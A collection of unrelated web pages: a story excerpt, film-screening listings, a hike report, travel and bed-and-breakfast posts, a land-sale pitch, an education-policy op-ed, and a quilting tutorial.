died stillborn between mind and paper.</p>   <p>I still smelled him and the orange.</p>   <p>Who started trends, I wondered, warming my orange in my hands. The wise, the powerful, the unconventional, the fearless, and the frightening. Maybe I should be grateful, for being last compared to a pickled shark. But today I&#x2019;d seen dreams that deserved to be painted, whether I sold them or not.</p>   <p>&#x201c;I can try,&#x201d; I said to the orange.</p>   <p>A Cadillac backfired, in tempo to a loud Latino cover of a Duran Duran song I hadn&#x2019;t heard in years. I jumped, then laughed, and wiped two decades of useless tears from my eyes. When I looked up again, I saw neon signs, glossy automobiles, and jeans-clad dancers. Women laughing. Men making love to women in a roundabout way, their cars dancing like courting birds of paradise. I saw joy. And I saw, finally, how to paint it.</p>   <p>I felt the muse&#x2019;s moment stretch into a minute, then eternity.</p>   <p>#</p>   <p><span>After learning how to transmute otherworldly gold and gems into actual money, I gave the Mare a new engine.</span></p>   <p>I work in the same adobe studio under a grove of feathery mesquite trees atop a low red hill, ten miles north of Wickenburg.</p>   <p>I don&#x2019;t know if I have the thirteenth orange. If the boy cheated himself, while the real magic sleeps above my worktable.&#xa0;I stuck cloves into the orange, knotted it into a tether of silk ribbon. The scent is still strong enough to flavor the entire studio with lush night and wheeling stars. It astonishes visitors.</p>   <p>When I paint, one window looks south over the desert, to the mountains and mirages of Phoenix. The other gives me pure north light, and a view down a winding dirt road toward the highway to Nevada.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

   <div>   <p>Selected architecture films from Central Europe</p>   <p>Architecture and the transformation of the urban landscape of the Post-socialist countries have been a very inspiring theme for video artists and filmmakers. Disappearing old neighborhoods, renamed streets, new districts, the conflicts and contrasts of the street or the newly found multiculturalism of Central European cities all provided sharp lens to interpret social changes in these societies. Videos, short and feature films do not only offer new viewpoints to look at these changes, they also help our understanding of urban transformation and architectural processes in the region. In preparation for this selection we invited organizations based in Central European cities and working with architectural and urban matters to collect films and curate screenings around the theme of architecture and the city. The cooperation consists of the establishment of a Central European Architecture Film Collection as well as of a series of screenings of experimental videos, documentary shorts and reportages from Bratislava, Brno, Prague, Cracow, Warsaw and Budapest.</p>   <p><strong>April 1, 15:30, Kino, Budapest</strong> Juraj Chlpik: Petr&#x17e;alka Identity (Bratislava, 2010, 25&#x2019;) Barbara Zavarsk&#xe1;, Ale&#x161; &#x160;edivec: The Slovakian National Gallery (Bratislava, 2010, 5&#x2019;) Jan Hanus: Squat Wars (Prague, 2009, 26&#x2019;) Heidrun Holzfeind: Behind the Iron Gate (Warsaw, 2009, 55&#x2019;) </p>   <p><strong>June 27, Bunkier Sztuki, Cracow</strong> Juraj Chlpik: Petr&#x17e;alka Identity (Bratislava, 2010, 25&#x2019;) Heidrun Holzfeind: Behind the Iron Gate (Warsaw, 2009, 55&#x2019;) &#x141;ukasz Sk&#x105;pski: Guide to Cracow (2005, 18&#x2019;) Zsolt Keserue, Levente Poly&#xe1;k, &#xc1;gnes D&#xe9;nes: Rounding Off (Budapest, 2007, 24&#x2032;)</p>   <p><strong>July 2, Trap&#xe9;z padl&#xe1;s, Budapest</strong> Heidrun Holzfeind: Behind the Iron Gate (Warsaw, 2009, 55&#x2019;) Juraj Chlpik: Petr&#x17e;alka Identity (Bratislava, 2010, 25&#x2019;) Zsolt Keserue, Levente Poly&#xe1;k, &#xc1;gnes D&#xe9;nes: Rounding Off (Budapest, 2007, 24&#x2032;)</p>   <p><strong>July 4, Warsaw</strong></p>   <p><strong>July 7-8, Brno</strong></p>   <p><strong>July 10, Bratislava</strong></p>   <p><strong>July 14, Prague</strong></p>   <p>Partners: </p>   <p>The Central European Architecture Film and Video Exchange is supported by the International Visegrad Fund. </p>  </div>

   <div>   <p>Thompson Peak</p>   <p>McDowell Mountains</p>   <p>Total Time: 4:00</p>   <p>Round trip mileage: 10.1 miles</p>   <p>Elevation Gain: 2200&#x2032;</p>   <p>Class I</p>   <p>Trailhead: Dixie Mine TH; flush toilets, water, $2/ person</p>   <p>Companions: Holly</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>Although not the highest mountain in the McDowells, Thompson Peak is the highest summit in the range with a legal trail to the top. With a fire road hike bringing you to an antennae farm at the summit, the hike doesn&#x2019;t off the most genuine of wilderness experiences, yet it&#x2019;s still makes for a great work out with fantastic views across the Valley. The trailhead for Thompson Peak is strangely in the middle of a gated community in Fountain Hills. The parking lot for the trail is located outside the community, and with brand new facilities, it looks more like a California winery than a trailhead bathroom.</p>   <figure>    <figcaption>     Nice TH facilities.    </figcaption>   </figure>   <p>From the parking area, one must walk through the neighborhood several blocks to get to the trailhead into the preserve. Unlike most of the other trailheads in the McDowells, this requires a small entrance fee, $2/ person, which we paid to the <b>Iron</b> Ranger on our way through. Thompson Peak is visible for the majority of the hike, although early on, the trail weaved in and out of about a dozen washes running tangent to the range. The trail meandered through the desert, with stunning views to the east, already quite high above the basin.</p>   <figure>    <figcaption>     Weaving around washes.    </figcaption>   </figure>   <p>After 2.7 miles, we intersected the main fire road that led to the summit of Thompson. Just beyond the road was Dixie Mine, one of several mines in the McDowells originally owned by the Red Mountain Consolidated Copper Mines Co. in the early 1900s, and turned over to the park system in 1977.</p>   <figure>    <figcaption>     Dixie Mine.    </figcaption>   </figure>   <p>We stopped here for a short break and eyed the road ahead. Up to this point, we had gained very little elevation, and the route significantly steepened with 1700&#x2032; of gain in the last 2.3 miles. The grade of the fire road quickly increased, and became paved in the steepest sections, something I&#x2019;ve only found in Arizona.</p>   <figure>    <figcaption>     Upper steepness.    </figcaption>   </figure>   <p>As we hit the ridgeline, the road briefly flattened, but subjected us to harsh winds which we had avoided all day. Trying to pick up the pace to find shelter from the wind, I was impressed with the steepness of the road switching below the summit, one of the steeper fire roads I&#x2019;ve been on. At times, we almost needed to steady ourselves with one hand on the near 60 degree slope. The grade eased as we hit the very developed summit. The gate into the antennae area was open, and a group of hikers were taking shelter from the wind behind some of the buildings. We did likewise, and had a short lunch looking out across the valley. We could see all the tents from the Waste Management Open in Northern Scottsdale, and I was glad to be nowhere near the traffic on the 101 far below.</p>   <figure>    <figcaption>     Summit Panorama.    </figcaption>   </figure>   <p>After finishing our light lunch, we headed down the steep road, jogging in places to get back below the ridgeline and out of the wind. The views on the descent were some of the best of the day, looking east to Four Peaks with some lingering snow in the gullys.</p>   <figure>    <figcaption>     The descent. Four Peaks in the distance.    </figcaption>   </figure>   <p>We took a short break at the end of the steep stretch before picking up the pace on the flatter ground and hiking the 3ish uneventful miles back to the car.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>  
   <div>   <p>The Union Pacific train rolls through a tunnel cut out of a tree trunk, past Omaha Central High School and several other historic Omaha buildings. You become mesmerized as you watch it exit the covered bridge that spans a flowing river. Then you spot another train cross an overhead steel bridge and travel back into the woods. There is something fascinating about model railroad layouts, especially miniature versions of real existing structures and trains. Add natural landscaping, the landscaping of the beautiful Lauritzen Gardens, and the Model Railroad Garden, a miniature Omaha, becomes a work of art.</p>   <p>The other areas of Lauritzen Gardens are beautiful, too. When you enter, you&#x2019;ll first pass through the atrium where caf&#xe9; tables are set up amidst tropical plants.</p>   <p>For the holidays the tables are replaced with poinsettia plants stacked into the shape of a giant Christmas tree and the atrium twinkles with little lights.</p>   <p><span>Don&#x2019;t miss a Midwest Wanderer post.&#xa0; For a FREE subscription, enter your e-mail address in the Subscribe2 box to the left and click Subscribe.</span></p>   <p>A brand new, much larger atrium is under construction and set to open in Fall 2014, promising more year-round botanical beauty.</p>   <p>Outside, a walk down the paths from garden to garden, admiring bright flowers and flitting monarch butterflies, was an enjoyable way to spend a beautiful summer morning with fellow travel writer Lisa Trudell of the Omaha-based .</p>   <p>With Lisa&#x2019;s familiarity with Lauritzen Gardens, she was able to point out all the don&#x2019;t-miss spots, like the Hitchcock-Kountze Victorian Garden, especially elegant with its bright flowers set against a red-brick fence with black wrought iron gates &#x2026;</p>   <p>&#x2026; and the Japanese Sunpu Garden Gate, a gift from sister city Shizuoka. The gate is the start of what will be a six-acre Japanese garden.</p>   <p>She also pointed out the art work &#x2026;</p>   <p>&#x2026; and the cascading Woodland Waterfall.</p>   <p>The highlight for me, however, was the Model Railroad Garden, where I snapped photo after photo and then stood and watched the trains go around and around the layout until Lisa reminded me we were running short on time.</p>   <p>Railroad fans will want to stop at Kenefick Park, across the parking lot from Lauritzen Gardens, where two great Union Pacific Railroad locomotives are parked. You will have noticed the locomotives from I-80 if you came into Omaha from the west. The Centennial No. 6900 is the largest and most powerful diesel-electric locomotive ever built. Big Boy No. 4023 is the world&#x2019;s largest steam locomotive.</p>   <p>, located just north of I-80 and south of Omaha&#x2019;s Old Market district, is open year-round. Check the web site for hours and admission rates.</p>   <p><em>Disclosure: My visit to Lauritzen Gardens was hosted by the &#xa0;and the Lauritzen Gardens, but any opinions expressed in this post are my own.</em></p>   <p>Thank you for reading Midwest Wanderer.

   <div>   <p>Hotels of all shapes, sizes, and price ranges exist all over the world and you can have privacy, room service, an amazing array of amenities, and the convenience of never having to clean the room yourself. Restaurants, shops, tours, transportation are all available right outside the lobby door, so why in the world would you choose to stay in a Bed and Breakfast?</p>   <p>Believe me; you want to stay in a Bed and Breakfast because they can also offer those very same amenities, along with a truly amazing and historical place to stay, not to mention that you will also have a fabulous breakfast included in your rate. I have stayed in Bed and Breakfast locations all over the United States and find that I often enjoy them much more than a conventional hotel stay. Here is an array of vastly different locations I have visited that you might want to add to your travel bucket list if you plan to visit any of these destinations.</p>   <p><em>The Villa D&#x2019;Citta in Chicago, Illinois</em></p>   <p>A lovely, historic Greystone mansion located in the prestigious Chicago neighborhood of Lincoln Park, which has been remodeled and furnished like an elegant Italian villa, this Bed and Breakfast is truly one of the most luxurious places my husband and I have ever stayed. With a beautiful, outside grotto and large hot tub, they have plenty of room for relaxing and even host cookouts in the summer. The back door leads inside to a nicely furnished and very comfortable lounge area with a fireplace which adjoins the dining area and the huge, state of the art kitchen.</p>   <div>    <p>Sign for the Villa D&#x2019;Citta in Chicago, Illinois.</p>   </div>   <p>The beautifully decorated living room is furnished with comfortable furniture for guests to gather and get to know one another. The Grand Tuscan Suite, where we stayed, is over 1,000 square feet and offers a flat screen television, fireplace, French doors out to a tiny but perfect terrace, and lovely hardwood floors. In addition, there is a huge bathroom with twin sinks, a marble soaking tub and a full steam shower. There is also another small bedroom with two twin beds which would be perfect for kids or another couple.&#xa0; Of course a full, hot, and delicious breakfast is served every morning and fresh fruit and freshly baked cookies are available every day, but the kitchen is also kept stocked for guests and you are free to help yourself. The fridge is full of cold tea and lemonade, as well as the makings for Paninis, pizzas, and waffles. A Panini maker, pizza oven, and waffle maker&#xa0;are just part of the incredible&#xa0;service here. You are also free to use the kitchen to prepare meals or to store takeout in the fridge.&#xa0;It&#x2019;s the perfect place to stay when visiting Chicago.</p>   <div>    <p>Quiche at Villa D&#x2019;Citta.</p>   </div>   <p><em>The Inns at El Rancho Merlita, Tucson, Arizona</em></p>   <p>Have you ever heard for Merle Norman, the cosmetics queen? Did you know she had a winter hideaway in Arizona? She certainly did and that hideaway has turned into an amazing Bed and Breakfast tucked away in a neighborhood on the outskirts of Tucson. Head up the driveway that wends through the desert landscape, through the lovely gates and peace and quiet envelops you. Pretty soon, you find that the history of this gem of a bed and breakfast location&#xa0;is just as fascinating as the peacefulness. In the 1950&#x2032;s when Tucson was a quiet, small town in the middle of the desert, Merle Norman bought a big tract of land off an old cattle trail.</p>   <p>She then commissioned her brother to design a wonderful 1950&#x2032;s ranch house that would be&#xa0;low and sprawling so it would stay cool in the desert heat and would have brick walls and a red tile roof, huge picture windows displaying the gorgeous views of both the desert and the mountains that surround Tucson. A long verandah would stretch across the front of&#xa0;the house and overlook a huge lawn and a beautiful swimming pool. He designed it exactly like that and that is&#xa0;just what you see when you pull in through the ornate, iron&#xa0;gates.&#xa0;There are actually two inns on the property; the Ranch House Inn and the Arroyo House Inn.</p>   <div>    <p>View of the backyard at The Inns at El Rancho Merlita in Tucson, Arizona.</p>   </div>   <p>The Arroyo House Inn is the estate&#x2019;s original guest house and has four rooms and suites, each with unique decor and luxury accommodations and amenities. All the rooms include luxurious linens, robes &amp; slippers, lovely bath products, wife and direct access to the outside patios. My husband and I stayed in the Ranch House Inn in the Spanish Colonial room and the gorgeous furnishings in this room were obviously influenced by Spain&#x2019;s colonial influence on Arizona. The huge bathroom and equally huge tub and a large&#xa0;walk-in closet were very nice additions to our room. The back yard&#xa0;of the&#xa0;inn is completely different from the front with its green grass lawn and has been maintained in a natural desert state. The inside of the Ranch House Inn is just as lovely as the rest of the property. It truly seems like a home and you are welcome to relax in the comfortable living room, with its Western theme. There is also a study with more very comfortable furniture and a TV, although there are also TV&#x2019;s in every bedroom. The breakfast at the Inns at El Rancho Merlita was wonderful &#x2013; and we also enjoyed the freshly baked cookies in the dining area every afternoon. It&#x2019;s the perfect place to stay when visiting Tucson.</p>   <div>    <p>Baked apple for breakfast at the Inns at El Rancho Merlita.</p>   </div>   <p><em>The Red Coach Inn, Niagara Falls, New York</em></p>   <p>One of the best things about this charming, historic (they opened for business in 1923!) Bed and Breakfast Inn, aside from the amazing suites, the incredible breakfasts, and the lovely neighborhood, is the fact that it is located just a few feet from the Upper Rapids which lead to Niagara Falls. The Inn was built in the architectural style of the old English Tudor period, was named for General Lafayette&#x2019;s famous red carriage, and is actually considered a Bed and Breakfast Hotel, which is why they include the wonderful breakfasts.</p>   <div>    <p>The Red Coach Inn in Niagara Falls, New York.</p>   </div>   <p>We enjoyed everything from hot oatmeal to freshly baked waffles each morning ordered off the menu and included in our rate. &#xa0;Our quite fabulous Sheffield Suite was actually located out the front door of the beautifully furnished lobby and down a brick sidewalk in another part of the Inn. An impressive foyer with burgundy carpet was, surprisingly, part of our suite with doors leading to a bedroom and our bathroom which had a fabulous Jacuzzi tub. The bedroom had gorgeous, antique furniture including a comfy king-size bed and a nice desk, a cozy gas fireplace and a little kitchen area with a fridge, microwave, coffeemaker and toaster. You could easily make your own breakfast here but why would you when a full breakfast is included in your rate? There was a telephone with voicemail and free long distance anywhere in the United States, a Bose stereo, a television, free wireless Internet, plush terrycloth robes, hair dryer, and Gilchrist and Soames amenities from England. The restaurant is a very nice place to relax and enjoy a meal, with a beautiful natural stone fireplace for winter and a patio for summer. &#xa0;It&#x2019;s the perfect place to stay when you visit Niagara Falls.</p>   <p><em>Pelican Cove Inn Bed and Breakfast, Carlsbad, California</em></p>   <p>Located just two blocks from the beach and three blocks from the lovely downtown area of Carlsbad, this beautiful, large beach house has been converted into a very comfortable Inn with 10 differently configured rooms. All the rooms have a private bath and private entrance, along with a feather bed and fireplace. &#xa0;Our suite was huge with a nice bedroom, sitting area, a big walk-in closet and bathroom. My husband and I were in the Santa Barbara room but each room is equally lovely and decorated beautifully, so any of the rooms would be a great choice. Huge, fluffy, and placed on a bed so high we had to use a stool to get in it, the feather bed was wonderful.</p>   <div>    <p>Santa Barbara room at the Pelican Cove Inn in Carlsbad, California.</p>   </div>   <p>The thoughtful touches, like a full bowl of candy on the mantle in our room made our stay truly special. There is plenty of off the street parking and you are welcome to relax in the charmingly furnished living room. You can have breakfast in the parlor, the sun porch, or on the patio, or they will even make a tray to take to your room. There is plenty to do in nearby Carlsbad from shopping in the many local shops, dining at a variety of restaurants, or even hopping the Coaster train into San Diego, which is close by.&#xa0;It&#x2019;s the perfect place to stay when you visit Carlsbad.</p>   <p><em>The Inn at Aberdeen, Valparaiso, Indiana</em></p>   <p>This beautiful, historic Inn, hidden away in a neighborhood of Valparaiso, is an 1850&#x2019;s home that was completely remodeled in 1995 into 11 fabulous suites with king or two queen beds, two person Jacuzzis, fireplaces, patios or balconies, large private baths, and free Wi-Fi. They even have a kitchenette suite available for longer stay. Each suite takes on a name from Scottish history. &#xa0;The beautiful entrance foyer is enhanced by the gorgeous staircase spiraling up to the suites from the lobby and to the right of the lobby area is a lovely solarium furnished with comfortable furniture to enjoy the sunshine. The solarium is equipped with a snack area with ice, drinks, snacks,&#xa0;and a refrigerator which is stocked with cheesecake! Guests are encouraged to gather in the solarium for an evening dessert, beverage, and some conversation.</p>   <div>    <p>The Inn at Aberdeen in Valparaiso, Indiana.</p>   </div>   <p>The Bannockburn Suite where my husband and I stayed is a large, luxurious expanse with a fireplace, sitting area, desk, balcony overlooking the property, and a large Jacuzzi tub in the bathroom. There is also an&#xa0;18-hole championship golf course which&#xa0;surrounds the Inn, as well as a salon spa and restaurant in the nearby shopping area which is just a short walk away, and beautiful Indiana Dunes State Park right on Lake Michigan is just a short drive.&#xa0;It&#x2019;s the perfect play to stay when you visit Valparaiso, Indiana.</p>   <div>    <p>Breakfast at the Inn at Aberdeen.</p>   </div>   <p><em>Carson Ridge Luxury Cabins, Carson, Washington</em></p>   <p>&#xa0;Only 45 miles east of Portland, Oregon&#xa0;and Vancouver, Washington and close to incredible hiking trails, waterfalls, wine tasting, fishing, and whitewater rafting, Carson Ridge Luxury Cabins is truly in an idyllic location. Every single inch of the 3 acre property is beautifully designed and landscaped and each of the cabins is individually and beautifully decorated. &#xa0;Private and perfect for a romantic getaway, the cabins are a really unique approach to a Bed and Breakfast.</p>   <div>    <p>Carson Ridge Luxury Cabins in Stevenson, Washington.</p>   </div>   <p>My husband and I stayed in the Mt. Adams cabin, which was amazing in every way, complete with a front porch swing to enjoy the view of the surrounding mountains. Our cabin had a huge king size four poster canopy bed made up with astonishingly soft bamboo sheets, a state-of-the-art hydrotherapy spa tub for two, and a cozy fireplace. Soft, warm robes were provided which would seem to be the ultimate in luxury until your hot and fresh breakfast is delivered to your door the next morning in a large basket. Cold juice, a freshly prepared quiche and yogurt and granola provide a great start to your day. The surrounding beauty of the Columbia River Gorge provides plenty of entertainment options including hiking, white water rafting, kayaking, wildlife viewing, and bird watching. It&#x2019;s the perfect place to stay when you are in Washington State.</p>   <div>    <p>Breakfast in a basket at Carson Ridge Luxury Cabins.</p>   </div>   <p><em>Henderson Park Inn, Destin, Florida</em></p>   <p>One of the biggest advantages to staying here is the incredible view of the sugar-white sand and Caribbean-like turquoise and azure water, but there are so many other advantages as well. My girlfriend and I were lucky enough to stay in the Presidential Suite on our visit and the gorgeous dark wood double doors provide entry to a huge, sun-lit room with gorgeous, comfortable furnishings. A beautifully appointed living room with a big, flat screen TV, an office area with a big desk, a dining table and a fridge filled with complimentary drinks and candy bars make this the perfect place for a getaway. A nice size wooden deck with outdoor furniture provides a view of the expansive beach which includes Henderson Park next door with miles of unspoiled sand and water.</p>   <div>    <p>View at the Henderson Park Inn in Destin, Florida.</p>   </div>   <p>The bedroom adjoining the living room had a huge and lovely king sized bed and beautiful, dark wood furniture with plenty of space to sit and read or enjoy the beach through the second set of French doors which opened onto the long deck, or watch the second TV. A bottle of wine, fresh grapes and some&#xa0;fresh flowers&#xa0;were provided on a bench at the end of the bed, a nice amenity that the Henderson Park Inn provides to all their guests. Everyone also has a nightly turn-down service. The Henderson Park Inn has free bikes to use when you have eaten your fill of the fabulous gourmet breakfasts, the wonderful boxed lunches which are included, the lemonade and cookies in the afternoon and the candy bars which are also available in the community fridge. Complimentary beach towels and beach chairs are a truly nice amenity, along with free Wi-Fi and a complimentary happy hour every evening. There are DVD players in every room and they offer a free library of DVD&#x2019;s which you can check out. It&#x2019;s the perfect place to stay when you are in Destin, Florida.</p>   <p><em>The Reynolds Mansion, Asheville, North Carolina</em></p>   <p>The incredible, opulent furnishings of this beautiful mansion in the Blue Ridge Mountains of North Carolina provide your first clue that this historic location has been around since 1847.

Spring Creek Ranch currently has 15 fully improved 2 Plus acres lots on 35 Acres-Paved Roads which is gated with wrought <b>iron</b> entrance with key pad.</p>   <p>Conveniently located in the geographic heart of Arizona, 8 mi to Sedona and 8 mi to Cottonwood, it is accessed from a private paved road and gate off of scenic Hwy 89A. The property fronts nearly a mile of Spring Creek with several springs and a nature trail. The topography is varied with the creek providing fresh water all year round to a lush riparian habitat within the ranch, gently sloped hillsides and rocky outcrops with dominating views.</p>   <p>Spring Creek Ranch is a natural retreat which is immersed and is surrounded by 3 sides of the Coconino National Forest, and State land on the west. While the 210 acre greater part of the land is untouched. Spring Creek runs through the center of the property for exactly one mile. Spring Creek is a rear to find that produces a year round water source of 6 Million gallons of Crystal Clear Natural Spring water daily. This flow never changes during any given year.</p>   <p><strong><span>Concern:</span></strong> Spring Creek Ranch is such a spectacular site that a vineyard located in the Page Springs area, Sedona&#x2019;s wine country. Is looking at this Land as one of the finest creek front for developing it into vineyard. Also it possibility for estate parcels features distant Red Rock and Mingus mountain views. Phoenix is only 1.5 h drive, while Flagstaff, Northern Arizona&#x2019;s only ski resort is 1 hour away. Conveniently located in the geographic heart of Arizona.</p>   <p><strong><span>Fact:</span></strong> The owner of the Spring Creek is willing to sell all or parts of the land. There is 29 Acres which the owner will sell out right for $725,000. This is $25,000 per acres. The land in this area is worth $85,000 to $125,000.00 per acres with no water or Creek or utilities.&#xa0; Currently the land base has 98 lots from 2 acres parcels to 4 acres. The land could be split into 5 pieces.</p>   <p>The&#xa0;<strong>I</strong>nternational Center of Spiritual and Ancestral Wisdom (ICSAW) would like to buy the whole land base of 244 Acres. However, there is this 29 acres and a possible 44 Acers with would meet the needs.

   <div>   <p>The Conversation has just published by ASU doctoral student Amanda Potterton and&#xa0;me. Below is the full text and then some comments on the writing process and what we left out:</p>   <blockquote>    <h3>Arne Duncan&#x2019;s legacy: growing influence of a network of private actors on public education</h3>    <p>Sherman Dorn and Amanda U. Potterton</p>    <p>Arne Duncan is the US Department of Education in December. Reactions to his legacy have been mixed. Some see him as , and others . He has been called the or .</p>    <p>As researchers of education policy, we see him differently: the hub of a network of policy advocates. As the head of the federal Department of Education, he actively facilitated private actors&#x2019; influence on public education policy.</p>    <h4>Private actors and connections</h4>    <p>From early 2009, Arne Duncan opened the federal agency&#x2019;s <b>gates</b> to a powerful network. He used the network, and was sometimes used by advocates for their own purposes.</p>    <p>Duncan was not just the cabinet secretary who played pickup basketball with the president. He was the head of of early political appointees who had personal connections to President Obama.</p>    <p>He was joined in 2009 by some of the most powerful members of a Democratic-leaning group of education reformers: among them were Deputy Secretary Jim Shelton, a former leader of education policy at the Bill and Melinda <b>Gates</b> Foundation, and Joanne Weiss, the Chief Operating Officer at NewSchools Venture Fund who became Duncan&#x2019;s chief of staff. is a venture philanthropy firm that sponsors the growth of charter school chains.</p>    <p>In 2009, both organizations were part of a growing network of advocates which Michigan State University political scientist the Boardroom Progressives.</p>    <p>These reformers have largely consisted of private actors, including leaders of education nonprofits, charter school founders and other nontraditional school leaders whose essential resources for reform come from the private wealth of major foundations, an approach that Berkeley education professor Janelle Scott has termed .&#x201d;</p>    <h4>Did those connections matter?</h4>    <p>The network that swirled around Duncan gave him ideas that he promoted through the Obama stimulus, and also the skilled personnel to run those programs.</p>    <p>Members of Duncan&#x2019;s reform network were partly the genesis and of a grant program, , that required applicants to expand opportunities for charter school creation, eliminate firewalls between student test scores and teacher evaluation, and commit to so-called &#x201c;college and career-ready standards.&#x201d; (The most common commitment of applicant states to such standards was to the .)</p>    <p>Once Duncan&#x2019;s department announced the Race to the Top program, the network connections were critical to promoting it. Under Duncan, Weiss ran the Race to the Top program.</p>    <p>But building support for his policies was also political: since 2001, federal education policy has often provided rhetorical and political license to state politicians who wanted support for policies they wanted anyway &#x2013; Paul Manna, Government Professor at William &amp; Mary College, called this license &#x201c;borrowed authority&#x201d; in his book about the politics of the No Child Left Behind Act.</p>    <p> continued this pattern, and many members of the network of education advocacy organizations the Common Core and the expansion of charter schools in many states.</p>    <p>Finally, the network was to directly or indirectly building state capacity in the Race to the Top years. In some cases, network members became critical state leaders, as they had under Duncan in Washington, DC.</p>    <p>In other cases, members of the network served as free consultants or as paid contractors for states that did not have the expertise to apply for or carry out Race to the Top projects. The <b>Gates</b> Foundation provided to states that agreed with the foundation&#x2019;s set of criteria.</p>    <h4>Why care about these networks &#x2013; isn&#x2019;t this how politics works?</h4>    <p>At one level, the influence of the education reform network around Duncan is not a surprise: political scientists have written for decades about the relationships between private actors and public policy. That intrigue is the source of terms such as and .</p>    <p>If public-private relationships are not new in policymaking, we should also not assume that the network around Duncan has been monolithic or inherently cohesive. As political scientist , the alliances have been evolving rather than centralized and tightly planned.</p>    <p>And yet, we should worry when substantially outside ordinary public politics by an increasingly private set of actors, whose with the public sphere can simultaneously be rivalrous, symbiotic and parasitic.</p>    <p>One does not need to be paranoid to worry about the concentration of decision-making in the hands of people who are friends and who are not accountable to the general public.</p>    <h4>The legacy of Duncan</h4>    <p>Maybe you approve of Arne Duncan&#x2019;s policies and are happy with his network because it moved policy. But after the Republicans swept the 2010 midterm elections in dozens of states, a conservative network agenda in state house after state house.</p>    <p>That ascendant Republican network, the American Legislative Exchange Council (ALEC), used the reform rhetoric and regulatory momentum of Arne Duncan for its own ends. Some of those goals mirrored Duncan&#x2019;s &#x2013; teacher evaluation tied to student test scores and expanded charter schools.</p>    <p>Others did not. Since 2010, many Republican-controlled states have attempted to restrict teacher collective bargaining and created or expanded private school voucher programs.</p>    <p>Arne Duncan did not invent political networks. And yet, to use , he has acted as a by bringing a private network to the fore in education, and further opening public education to privatized influences.</p>   </blockquote>   <p>The question&#xa0;left unanswered&#xa0;at the end of&#xa0;the article: what&#xa0;<em>is</em> the proper relationship between civil society and regulatory/administrative bodies? Tune in next time&#x2026;</p>   <p>Now, a little bit on the back-end of writing a piece like this on short order. I was sent the invitation by an editor at Monday afternoon, shortly before a research meeting I had with Amanda Potterton, and we agreed to work on it over &#x2026; about 38 hours. The usual parameters for pieces like this included a space&#xa0;limit, around 800 words (which ballooned a bit in editing). We also&#xa0;worked&#xa0;out what we could say that others have not said before; we mentioned&#xa0;the common themes of other news stories and blogs in the first paragraph and linked to examples (including one from 2009 that is still relevant). We quickly identified and pored over some relevant literature, drafted the text on Tuesday, and worked with the site&#x2019;s editors on Wednesdays to finish editing it.</p>   <p>There were plenty of scenes left on the cutting-room floor&#x2013;my favorite is the confrontation between Billy Crystal&#x2019;s Miracle Max and Robert Downey, Jr.&#x2019;s Tony Stark. In the draft, the battle destroyed Chicago. But it&#x2019;s lost to the ages now.</p>   <p>No, there really were ideas left out of this &#x2014; when you have a tight word-limit, you have essentially one point to make, and we tried to squeeze 1.5 points&#xa0;into it. We did not talk about Arne Duncan as a regulator and his expansion of the regulatory role of USDOE. I guessed that he coordinated policy better with the White House than the majority of cabinet secretaries, but that is not documented and probably a &#x201c;who cares?&#x201d; point for anyone but political&#xa0;junkies. We talked about Duncan as a somewhat gaffe-prone secretary, but his suburban-moms quip doesn&#x2019;t &#xa0;come close to either Margaret &#x201c;NCLB is 99.9% pure&#x201d; Spellings or Rod &#x201c;NEA is a terrorist organization&#x201d; Paige. So we settled on&#xa0;influence networks, leaving out the &#x201c;what is the proper role&#x201d; question.</p>   <p>And speaking of proper roles, what is left for someone else to tackle is how Duncan changed the role of the Secretary of Education. Remember, he is only the ninth in the department&#x2019;s history. If we had focused on what Duncan left the next secretary at an institutional level, below are the most prominent roles of the Secretary of Education at the end of the Duncan era:</p>   <ul>    <li>Implementer of major education statutes&#xa0;(inherited from when there was an Office of Education in the Department of Health, Education, and Welfare [HEW])</li>    <li>Regulator for education programs (inherited from HEW days)</li>    <li>Proxy bully pulpit on education issues (Terrel Bell, most prominently)</li>    <li>Manager of the department (inherent in the role)</li>    <li>Developer of education policy (relationship with White House staff)</li>    <li>Hub of a mostly-private network (Arne Duncan)</li>   </ul>   <p>In parentheses for each is my rough guess at the origin of the role.</p>   <div>    <div>     If you enjoyed this post, please consider to have future articles delivered to your feed reader.    </div>   </div>  </div>  
   <div>   <p>Hello, Quilters! &#xa0;Today is Tuesday, and that means we need to get to work&#x2026;doodling and quilting! &#xa0;At the risk of repeating myself, drawing the motifs on paper is an excellent way to practice. &#xa0;If you can&#x2019;t draw a motif, you&#x2019;ll never be able to quilt it smoothly. &#xa0;So pull out your paper and pen, or a dry-erase board as Elizabeth (one of our readers) recommends and practice while you are at your computer. &#xa0;The stitching will flow much easier when you can draw the pattern smoothly.</p>   <p>Today&#x2019;s pattern is very very simple. &#xa0;The Picket Fence can stand alone and looks adorable on any floral quilt, or child&#x2019;s quilt. &#xa0;If you like, you can add a &#x201c;second pass&#x201d; of spiral flowers. &#xa0;See the<strong> Spiral &#xa0;Lollipop Flower</strong> tutorialand &#xa0;<strong>The Tulip</strong> would also look great. &#xa0;See that tutorial </p>   <p>This pattern can be stitched in any size. &#xa0;For today&#x2019;s tutorial, we will stitch a 5 inch fence. &#xa0;Begin by drawing a line along the length of your fabric. &#xa0;This is the&#xa0;<strong><em>Baseline.&#xa0;</em>&#xa0;</strong>Draw the second line four inches above the <em>baseline.</em> &#xa0;Draw a third line, one inch above your second line. &#xa0;(It will be five inches from the <em>baseline.)</em></p>   <p>Then draw lines perpendicular to the<em> baseline</em> and 1-1/2 inch apart. &#xa0;We will stitch on either side of these lines, but not on the lines.&#xa0;</p>   <p>Begin stitching on the <em>baseline.</em> &#xa0;Stitch straight up to the 4 inch line and angle up to the top line. &#xa0;Angle back down, then stitch right next to the drawn line and back to the baseline.</p>   <p>Stitch over a few stitches and begin stitching the second picket.</p>   <p>The above photo shows my Bernina with the offset quilting foot that I prefer. &#xa0;I used Sulky 40 wt thread and #80 Quilting needle.</p>   <p>The picket fence would look lovely as a border. &#xa0;In some quilts, I think it would be lovely all by itself&#x2026;</p>   <p>Of course, I would never be able to resist all that open space&#x2026;.</p>   <p>I prefer a variety of flowers for more interest. &#xa0;A row of grass would be cute too. &#xa0;While I&#x2019;m looking at this&#x2026;a bird sitting on the fence would be darling&#x2026;</p>   <p>Sometimes, you just have to stop&#x2026;.</p>   <p>I hope you enjoy this easy tutorial. &#xa0; Use it. Make it your own. &#xa0;Share it. Pin it. &#xa0;I 